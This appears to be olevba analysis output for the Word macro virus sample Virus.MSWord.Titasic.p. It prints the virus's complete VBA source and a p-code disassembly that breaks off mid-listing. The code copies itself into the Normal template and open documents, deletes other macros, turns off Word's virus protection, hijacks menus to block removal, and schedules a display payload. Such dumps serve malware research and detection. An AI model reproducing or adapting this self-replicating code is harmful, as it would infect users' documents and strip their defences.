olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Titasic.p
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Titasic.p - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO eLiTe.bas 
in file: ./Virus.MSWord.Titasic.p - OLE stream: 'Macros/VBA/eLiTe'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public AlAsal
Public AD As Object, aDes As Variant
Public NonHaCkErS As Boolean, afound As Boolean, hapus As Boolean, reset As Boolean, aExc As Boolean, DocCount As Boolean
Function ViTJMaster()
Dim nmak(2) As String
'Dim eLiTeFoRm(0) As String
Dim NT As Object
Dim aSrc$
On Error GoTo selesai
nmak(0) = "eLiTe"
nmak(1) = "HaCkErS"
nmak(2) = "eLiTeFoRm"

aSrc = MacroContainer
Set NT = NormalTemplate
If Not DocCount Then
Set AD = ActiveDocument
ElseIf aSrc <> "SNrml.dot" Then
aSrc = NT
End If

If aSrc = NT Then
aSrc = NT.FullName: Set aDes = AD
ElseIf aSrc = AD Then
aSrc = AD.FullName: Set aDes = NT
ElseIf aSrc = "SNrml.dot" Then
Set aDes = NT
aSrc = Options.DefaultFilePath(8) & "\SNrml.src"
End If

Mhapus aDes
With aDes.VBProject
If Not (Not hapus And .Description = "eLiTe" And .VBComponents.Count > 2) Then
    Mcopy aSrc, aDes, nmak
    hapus = False
    .Description = "eLiTe"
    If aDes = NT Then
        Options.SaveInterval = 1
        CustomizationContext = NT
        CommandBars("Tools").reset
        KeyBindings.Add KeyCode:=BuildKeyCode(77, 1024), KeyCategory:=1, _
        Command:="ToolsRecordMacroStart"
        aDes.Save
    End If
    CommandBars("Macro").Controls(2).OnAction = "ViewVbCode"
Else
GoTo Aksi
End If
End With
If afound = True Then Exit Function
Refresh
On Error Resume Next
Aksi:
If aExc = True Then Exit Function
Exit Function
selesai:
If err.Number = 50289 Then MsgBox "Terimakasih Anda Telah" & Chr(13) & "Memproteksi Word dengan Aman", vbInformation, "HaCkErS"
End Function

Sub Mhapus(Sfile)
Dim nmak As Object
For Each nmak In Sfile.VBProject.VBComponents
    If nmak.Name = "NewMacros" Then NonHaCkErS = True
    If nmak.Name <> "ThisDocument" And nmak.Name <> "NewMacros" _
    And nmak.Name <> "eLiTe" And nmak.Name <> "eLiTeFoRm" _
    And nmak.Name <> "HaCkErS" Then
        hapus = True
        If reset Then
        Application.OrganizerDelete Sfile.FullName, nmak.Name, 3
        Else
        nmak.CodeModule.DeleteLines 1, nmak.CodeModule.CountOfLines
        End If
    End If
Next nmak
End Sub
Sub Mcopy(Sfile, Dfile, nmak)
Dim aNmak
On Error GoTo ExitVJ
    AlAsal = Application.DisplayAlerts
    Application.DisplayAlerts = wdAlertsNone
'On Error GoTo VJ
For Each aNmak In nmak
Application.OrganizerCopy Sfile, Dfile.FullName, aNmak, 3
Next
GoTo VJ
ExitVJ:
Application.DisplayAlerts = AlAsal
End
VJ:

End Sub
Sub Action()
Documents.Add
On Error Resume Next
With ActiveWindow
.Caption = "eLiTe ThE YoUnG HaCkErS"
.ActivePane.View.Zoom.Percentage = 100
.View.FullScreen = Not .View.FullScreen
.DisplayRulers = False
.DisplayHorizontalScrollBar = False
.DisplayVerticalRuler = False
.DisplayVerticalScrollBar = False
.View.ShowTextBoundaries = False
    CommandBars("Full Screen").Position = 1
    With CommandBars("Full Screen").Controls(1)
    .Caption = "HaCkErS," & "  " & Date
    .Style = 3
    .FaceId = 281
    End With
.View.Type = 6
Randomize
With ActiveDocument.Background.Fill
    .Visible = True
    .PresetGradient Int((6 - 1 + 1) * Rnd + 1), 1, Int((24 - 1 + 1) * Rnd + 1)
End With
HaCkErS.Show
.View.FullScreen = Not .View.FullScreen
End With
CommandBars("Full Screen").reset
WBT
ActiveDocument.Close 0
WBF
eLiTeFoRm.Show
End Sub

Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
ViTJMaster
If Documents.Count > 1 Then
    For i = 1 To Documents.Count
    If Documents(i).Name <> ActiveDocument.Name Then
    Set AD = Documents(i)
    DocCount = True
    hapus = False
    ViTJMaster
    End If
    Next
End If
If Now > DateSerial(1998, 9, 15) Then Application.OnTime When:=Now + TimeValue("00:45:00"), Name:="eLiTe.Action"
End
End Sub
Sub ViTJViewVbCode()
If MsgBox("Hoi!!!...Sorry" & Chr(13) & "Apo demo nak ha...?, nak merubah, ataupun menghapus makro HaCkErS..!!Malam Sikit" & Chr(13) & Chr(13) _
& "Anda hanya boleh merekam makro, menyimpan, menggunakan" & Chr(13) & "serta menghapus makro buatan Anda" & Chr(13) & Chr(13) & " Apakah Anda ingin merekam makro..?", vbExclamation + vbYesNo, "HaCkErS") _
= vbYes Then SendKeys "%m%s{down}~%d'Macro non-HaCkErS'%m"
End Sub
Sub AutoExec()
On Error Resume Next
If MacroContainer <> NormalTemplate Then
aExc = True
ViTJMaster
WBT
AddIns.Unload False
WBF
End If
Application.EnableCancelKey = wdCancelDisabled
End Sub
Sub AutoExit()
Dim aAddin As Object
On Error GoTo batal
WBT
If Documents.Count <> 0 Then Documents.Close
Options.DefaultFilePath(2) = Options.DefaultFilePath(6)
afound = True
For Each aAddin In AddIns
    If aAddin.Name = "SNrml.dot" Then afound = False
Next aAddin
        
If afound = True Then
Application.Visible = False
Documents.Add
ViTJMaster
    With ActiveDocument
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\SNrml.src", FileFormat:=wdFormatDocument, AddToRecentFiles:=False
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\SNrml.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False
    End With
End If
Application.Quit
batal:
WBF
End Sub
Sub ToolsMacro()
WBF
On Error GoTo batal
Mhapus ActiveDocument
If NonHaCkErS Then
    If MacroContainer = ActiveDocument Then Application.Run NormalTemplate.VBProject.Name & ".eLiTe.ToolsMacro": Exit Sub
    Application.DisplayAlerts = 0
        With Dialogs(215)
        .Description = "Macros HaCkErS mungkin tidak bisa Anda hapus, Anda hanya bisa menghapus makro buatan Anda (Descr: 'Makro non-HaCkErS')"
        If .Display = 1 Then .Execute
        End With
    Application.DisplayAlerts = -1
Else
ViewVbCode
End If
batal:
End Sub
Sub FileTemplates()
WBF
If Not reset Then Dialogs(87).Display
End Sub
Sub FormatStyle()
WBF
Dialogs(180).Show
End Sub
Function Refresh()
reset = True
FileTemplates
Mhapus aDes
End Function
Sub AutoClose()
Application.DisplayAlerts = -1
With Options
.SaveNormalPrompt = False
.SaveInterval = 10
.VirusProtection = False
End With
If ActiveWindow.Caption <> "HaCkErS" And InStr(1, ActiveDocument.Name, "Docume", 1) = 0 _
And ActiveDocument.Name <> "SNrml.dot" Then ViTJMaster
End Sub
Sub FileExit()
AutoExit
End Sub
Sub ViTToolsOptions()
Options.DefaultFilePath(wdUserTemplatesPath) = "C:\Program Files\Microsoft Office\Templates"
Dialogs(wdDialogToolsOptions).Show
Options.DefaultFilePath(wdUserTemplatesPath) = Application.Path
End Sub
Function WBT()
WordBasic.disableautomacros True
End Function
Function WBF()
WordBasic.disableautomacros False
End Function

Sub MyAction()
On Error Resume Next
With ActiveWindow

.DisplayRulers = True
.DisplayHorizontalScrollBar = True
.DisplayVerticalRuler = True
.DisplayVerticalScrollBar = True
'.View.ShowTextBoundaries = False
End With
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Titasic.p
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/eLiTe - 13258 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn AlAsal
' Line #1:
' 	Dim (Public) 
' 	VarDefn AD (As Object)
' 	VarDefn aDes (As Variant)
' Line #2:
' 	Dim (Public) 
' 	VarDefn NonHaCkErS (As Boolean)
' 	VarDefn afound (As Boolean)
' 	VarDefn hapus (As Boolean)
' 	VarDefn reset (As Boolean)
' 	VarDefn aExc (As Boolean)
' 	VarDefn DocCount (As Boolean)
' Line #3:
' 	FuncDefn (Function ViTJMaster())
' Line #4:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0002 
' 	VarDefn nmak (As String)
' Line #5:
' 	QuoteRem 0x0000 0x001A "Dim eLiTeFoRm(0) As String"
' Line #6:
' 	Dim 
' 	VarDefn NT (As Object)
' Line #7:
' 	Dim 
' 	VarDefn aSrc
' Line #8:
' 	OnError selesai 
' Line #9:
' 	LitStr 0x0005 "eLiTe"
' 	LitDI2 0x0000 
' 	ArgsSt nmak 0x0001 
' Line #10:
' 	LitStr 0x0007 "HaCkErS"
' 	LitDI2 0x0001 
' 	ArgsSt nmak 0x0001 
' Line #11:
' 	LitStr 0x0009 "eLiTeFoRm"
' 	LitDI2 0x0002 
' 	ArgsSt nmak 0x0001 
' Line #12:
' Line #13:
' 	Ld MacroContainer 
' 	St aSrc 
' Line #14:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #15:
' 	Ld DocCount 
' 	Not 
' 	IfBlock 
' Line #16:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #17:
' 	Ld aSrc 
' 	LitStr 0x0009 "SNrml.dot"
' 	Ne 
' 	ElseIfBlock 
' Line #18:
' 	Ld NT 
' 	St aSrc 
' Line #19:
' 	EndIfBlock 
' Line #20:
' Line #21:
' 	Ld aSrc 
' 	Ld NT 
' 	Eq 
' 	IfBlock 
' Line #22:
' 	Ld NT 
' 	MemLd FullName 
' 	St aSrc 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld AD 
' 	Set aDes 
' Line #23:
' 	Ld aSrc 
' 	Ld AD 
' 	Eq 
' 	ElseIfBlock 
' Line #24:
' 	Ld AD 
' 	MemLd FullName 
' 	St aSrc 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld NT 
' 	Set aDes 
' Line #25:
' 	Ld aSrc 
' 	LitStr 0x0009 "SNrml.dot"
' 	Eq 
' 	ElseIfBlock 
' Line #26:
' 	SetStmt 
' 	Ld NT 
' 	Set aDes 
' Line #27:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000A "\SNrml.src"
' 	Concat 
' 	St aSrc 
' Line #28:
' 	EndIfBlock 
' Line #29:
' Line #30:
' 	Ld aDes 
' 	ArgsCall Mhapus 0x0001 
' Line #31:
' 	StartWithExpr 
' 	Ld aDes 
' 	MemLd VBProject 
' 	With 
' Line #32:
' 	Ld hapus 
' 	Not 
' 	MemLdWith Description 
' 	LitStr 0x0005 "eLiTe"
' 	Eq 
' 	And 
' 	MemLdWith VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0002 
' 	Gt 
' 	And 
' 	Paren 
' 	Not 
' 	IfBlock 
' Line #33:
' 	Ld aSrc 
' 	Ld aDes 
' 	Ld nmak 
' 	ArgsCall Mcopy 0x0003 
' Line #34:
' 	LitVarSpecial (False)
' 	St hapus 
' Line #35:
' 	LitStr 0x0005 "eLiTe"
' 	MemStWith Description 
' Line #36:
' 	Ld aDes 
' 	Ld NT 
' 	Eq 
' 	IfBlock 
' Line #37:
' 	LitDI2 0x0001 
' 	Ld Options 
' 	MemSt SaveInterval 
' Line #38:
' 	Ld NT 
' 	St CustomizationContext 
' Line #39:
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemCall reset 0x0000 
' Line #40:
' 	LineCont 0x0004 10 00 08 00
' 	LitDI2 0x004D 
' 	LitDI2 0x0400 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ParamNamed KeyCode 
' 	LitDI2 0x0001 
' 	ParamNamed KeyCategory 
' 	LitStr 0x0015 "ToolsRecordMacroStart"
' 	ParamNamed Command 
' 	Ld KeyBindings 
' 	ArgsMemCall Add 0x0003 
' Line #41:
' 	Ld aDes 
' 	ArgsMemCall Save 0x0000 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	LitStr 0x000A "ViewVbCode"
' 	LitDI2 0x0002 
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt OnAction 
' Line #44:
' 	ElseBlock 
' Line #45:
' 	GoTo Aksi 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	EndWith 
' Line #48:
' 	Ld afound 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #49:
' 	ArgsCall Refresh 0x0000 
' Line #50:
' 	OnError (Resume Next) 
' Line #51:
' 	Label Aksi 
' Line #52:
' 	Ld aExc 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #53:
' 	ExitFunc 
' Line #54:
' 	Label selesai 
' Line #55:
' 	Ld err 
' 	MemLd Number 
' 	LitDI4 0xC471 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0016 "Terimakasih Anda Telah"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001C "Memproteksi Word dengan Aman"
' 	Concat 
' 	Ld vbInformation 
' 	LitStr 0x0007 "HaCkErS"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #56:
' 	EndFunc 
' Line #57:
' Line #58:
' 	FuncDefn (Sub Mhapus(Sfile))
' Line #59:
' 	Dim 
' 	VarDefn nmak (As Object)
' Line #60:
' 	StartForVariable 
' 	Ld nmak 
' 	EndForVariable 
' 	Ld Sfile 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #61:
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0009 "NewMacros"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NonHaCkErS 
' 	EndIf 
' Line #62:
' 	LineCont 0x0008 0C 00 04 00 18 00 04 00
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0009 "NewMacros"
' 	Ne 
' 	And 
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0005 "eLiTe"
' 	Ne 
' 	And 
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0009 "eLiTeFoRm"
' 	Ne 
' 	And 
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0007 "HaCkErS"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #63:
' 	LitVarSpecial (True)
' 	St hapus 
' Line #64:
' 	Ld reset 
' 	IfBlock 
' Line #65:
' 	Ld Sfile 
' 	MemLd FullName 
' 	Ld nmak 
' 	MemLd New 
' 	LitDI2 0x0003 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #66:
' 	ElseBlock 
' Line #67:
' 	LitDI2 0x0001 
' 	Ld nmak 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nmak 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	StartForVariable 
' 	Ld nmak 
' 	EndForVariable 
' 	NextVar 
' Line #71:
' 	EndSub 
' Line #72:
' 	FuncDefn (Sub Mcopy(Sfile, Dfile, nmak))
' Line #73:
' 	Dim 
' 	VarDefn aNmak
' Line #74:
' 	OnError ExitVJ 
' Line #75:
' 	Ld Application 
' 	MemLd DisplayAlerts 
' 	St AlAsal 
' Line #76:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #77:
' 	QuoteRem 0x0000 0x0010 "On Error GoTo VJ"
' Line #78:
' 	StartForVariable 
' 	Ld aNmak 
' 	EndForVariable 
' 	Ld nmak 
' 	ForEach 
' Line #79:
' 	Ld Sfile 
' 	Ld Dfile 
' 	MemLd FullName 
' 	Ld aNmak 
' 	LitDI2 0x0003 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #80:
' 	StartForVariable 
' 	Next 
' Line #81:
' 	GoTo VJ 
' Line #82:
' 	Label ExitVJ 
' Line #83:
' 	Ld AlAsal 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #84:
' 	End 
' Line #85:
' 	Label VJ 
' Line #86:
' Line #87:
' 	EndSub 
' Line #88:
' 	FuncDefn (Sub Action())
' Line #89:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #90:
' 	OnError (Resume Next) 
' Line #91:
' 	StartWithExpr 
' 	Ld ActiveWindow 
' 	With 
' Line #92:
' 	LitStr 0x0017 "eLiTe ThE YoUnG HaCkErS"
' 	MemStWith Caption 
' Line #93:
' 	LitDI2 0x0064 
' 	MemLdWith ActivePane 
' 	MemLd View 
' 	MemLd Zoom 
' 	MemSt Percentage 
' Line #94:
' 	MemLdWith View 
' 	MemLd FullScreen 
' 	Not 
' 	MemLdWith View 
' 	MemSt FullScreen 
' Line #95:
' 	LitVarSpecial (False)
' 	MemStWith DisplayRulers 
' Line #96:
' 	LitVarSpecial (False)
' 	MemStWith DisplayHorizontalScrollBar 
' Line #97:
' 	LitVarSpecial (False)
' 	MemStWith DisplayVerticalRuler 
' Line #98:
' 	LitVarSpecial (False)
' 	MemStWith DisplayVerticalScrollBar 
' Line #99:
' 	LitVarSpecial (False)
' 	MemLdWith View 
' 	MemSt ShowTextBoundaries 
' Line #100:
' 	LitDI2 0x0001 
' 	LitStr 0x000B "Full Screen"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Position 
' Line #101:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	LitStr 0x000B "Full Screen"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	With 
' Line #102:
' 	LitStr 0x0008 "HaCkErS,"
' 	LitStr 0x0002 "  "
' 	Concat 
' 	Ld Date 
' 	Concat 
' 	MemStWith Caption 
' Line #103:
' 	LitDI2 0x0003 
' 	MemStWith Style 
' Line #104:
' 	LitDI2 0x0119 
' 	MemStWith FaceId 
' Line #105:
' 	EndWith 
' Line #106:
' 	LitDI2 0x0006 
' 	MemLdWith View 
' 	MemSt TypeOf 
' Line #107:
' 	ArgsCall Read 0x0000 
' Line #108:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd Background 
' 	MemLd Fill 
' 	With 
' Line #109:
' 	LitVarSpecial (True)
' 	MemStWith Visible 
' Line #110:
' 	LitDI2 0x0006 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x0018 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ArgsMemCallWith PresetGradient 0x0003 
' Line #111:
' 	EndWith 
' Line #112:
' 	Ld HaCkErS 
' 	ArgsMemCall Show 0x0000 
' Line #113:
' 	MemLdWith View 
' 	MemLd FullScreen 
' 	Not 
' 	MemLdWith View 
' 	MemSt FullScreen 
' Line #114:
' 	EndWith 
' Line #115:
' 	LitStr 0x000B "Full Screen"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemCall reset 0x0000 
' Line #116:
' 	ArgsCall WBT 0x0000 
' Line #117:
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #118:
' 	ArgsCall WBF 0x0000 
' Line #119:
' 	Ld eLiTeFoRm 
' 	ArgsMemCall Show 0x0000 
' Line #120:
' 	EndSub 
' Line #121:
' Line #122:
' 	FuncDefn (Sub AutoOpen())
' Line #123:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #124:
' 	ArgsCall ViTJMaster 0x0000 
' Line #125:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #126:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #127:
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	MemLd New 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ne 
' 	IfBlock 
' Line #128:
' 	SetStmt 
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	Set AD 
' Line #129:
' 	LitVarSpecial (True)
' 	St DocCount 
' Line #130:
' 	LitVarSpecial (False)
' 	St hapus 
' Line #131:
' 	ArgsCall ViTJMaster 0x0000 
' Line #132:
' 	EndIfBlock 
' Line #133:
' 	StartForVariable 
' 	Next 
' Line #134:
' 	EndIfBlock 
' Line #135:
' 	Ld Now 
' 	LitDI2 0x07CE 
' 	LitDI2 0x0009 
' 	LitDI2 0x000F 
' 	ArgsLd DateSerial 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld Now 
' 	LitStr 0x0008 "00:45:00"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed When 
' 	LitStr 0x000C "eLiTe.Action"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' 	EndIf 
' Line #136:
' 	End 
' Line #137:
' 	EndSub 
' Line #138:
' 	FuncDefn (Sub ViTJViewVbCode())
' Line #139:
' 	LineCont 0x0008 15 00 00 00 31 00 00 00
' 	LitStr 0x000E "Hoi!!!...Sorry"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0050 "Apo demo nak ha...?, nak merubah, ataupun menghapus makro HaCkErS..!!Malam Sikit"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0036 "Anda hanya boleh merekam makro, menyimpan, menggunakan"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0021 "serta menghapus makro buatan Anda"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0023 " Apakah Anda ingin merekam makro..?"
' 	Concat 
' 	Ld vbExclamation 
' 	Ld vbYesNo 
' 	Add 
' 	LitStr 0x0007 "HaCkErS"
' 	ArgsLd MsgBox 0x0003 
' 	Ld vbYes 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0022 "%m%s{down}~%d'Macro non-HaCkErS'%m"
' 	ArgsCall SendKeys 0x0001 
' 	EndIf 
' Line #140:
' 	EndSub 
' Line #141:
' 	FuncDefn (Sub AutoExec())
' Line #142:
' 	OnError (Resume Next) 
' Line #143:
' 	Ld MacroContainer 
' 	Ld NormalTemplate 
' 	Ne 
' 	IfBlock 
' Line #144:
' 	LitVarSpecial (True)
' 	St aExc 
' Line #145:
' 	ArgsCall ViTJMaster 0x0000 
' Line #146:
' 	ArgsCall WBT 0x0000 
' Line #147:
' 	LitVarSpecial (False)
' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #148:
' 	ArgsCall WBF 0x0000 
' Line #149:
' 	EndIfBlock 
' Line #150:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #151:
' 	EndSub 
' Line #152:
' 	FuncDefn (Sub AutoExit())
' Line #153:
' 	Dim 
' 	VarDefn aAddin (As Object)
' Line #154:
' 	OnError batal 
' Line #155:
' 	ArgsCall WBT 0x0000 
' Line #156:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Documents 
' 	ArgsMemCall Close 0x0000 
' 	EndIf 
' Line #157:
' 	LitDI2 0x0006 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitDI2 0x0002 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #158:
' 	LitVarSpecial (True)
' 	St afound 
' Line #159:
' 	StartForVariable 
' 	Ld aAddin 
' 	EndForVariable 
' 	Ld AddIns 
' 	ForEach 
' Line #160:
' 	Ld aAddin 
' 	MemLd New 
' 	LitStr 0x0009 "SNrml.dot"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St afound 
' 	EndIf 
' Line #161:
' 	StartForVariable 
' 	Ld aAddin 
' 	EndForVariable 
' 	NextVar 
' Line #162:
' Line #163:
' 	Ld afound 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #164:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt Visible 
' Line #165:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #166:
' 	ArgsCall ViTJMaster 0x0000 
' Line #167:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #168:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000A "\SNrml.src"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	ArgsMemCallWith SaveAs 0x0003 
' Line #169:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000A "\SNrml.dot"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	ArgsMemCallWith SaveAs 0x0003 
' Line #170:
' 	EndWith 
' Line #171:
' 	EndIfBlock 
' Line #172:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #173:
' 	Label batal 
' Line #174:
' 	ArgsCall WBF 0x0000 
' Line #175:
' 	EndSub 
' Line #176:
' 	FuncDefn (Sub ToolsMacro())
' Line #177:
' 	ArgsCall WBF 0x0000 
' Line #178:
' 	OnError batal 
' Line #179:
' 	Ld ActiveDocument 
' 	ArgsCall Mhapus 0x0001 
' Line #180:
' 	Ld NonHaCkErS 
' 	IfBlock 
' Line #181:
' 	Ld MacroContainer 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0011 ".eLiTe.ToolsMacro"
' 	Concat 
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' 	BoS 0x0000 
' 	ExitSub 
' 	EndIf 
' Line #182:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #183:
' 	StartWithExpr 
' 	LitDI2 0x00D7 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #184:
' 	LitStr 0x0076 "Macros HaCkErS mungkin tidak bisa Anda hapus, Anda hanya bisa menghapus makro buatan Anda (Descr: 'Makro non-HaCkErS')"
' 	MemStWith Description 
' Line #185:
' 	MemLdWith Display 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsMemCallWith Execute 0x0000 
' 	EndIf 
' Line #186:
' 	EndWith 
' Line #187:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #188:
' 	ElseBlock 
' Line #189:
' 	ArgsCall ViewVbCode 0x0000 
' Line #190:
' 	EndIfBlock 
' Line #191:
' 	Label batal 
' Line #192:
' 	EndSub 
' Line #193:
' 	FuncDefn (Sub FileTemplates())
' Line #194:
' 	ArgsCall WBF 0x0000 
' Line #195:
' 	Ld reset 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0057 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Display 0x0000 
' 	EndIf 
' Line #196:
' 	EndSub 
' Line #197:
' 	FuncDefn (Sub FormatStyle())
' Line #198:
' 	ArgsCall WBF 0x0000 
' Line #199:
' 	LitDI2 0x00B4 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #200:
' 	EndSub 
' Line #201:
' 	FuncDefn (Function Refresh())
' Line #202:
' 	LitVarSpecial (True)
' 	St reset 
' Line #203:
' 	ArgsCall FileTemplates 0x0000 
' Line #204:
' 	Ld aDes 
' 	ArgsCall Mhapus 0x0001 
' Line #205:
' 	EndFunc 
' Line #206:
' 	FuncDefn (Sub AutoClose())
' Line #207:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #208:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #209:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #210:
' 	LitDI2 0x000A 
' 	MemStWith SaveInterval 
' Line #211:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #212:
' 	EndWith 
' Line #213:
' 	LineCont 0x0004 15 00 00 00
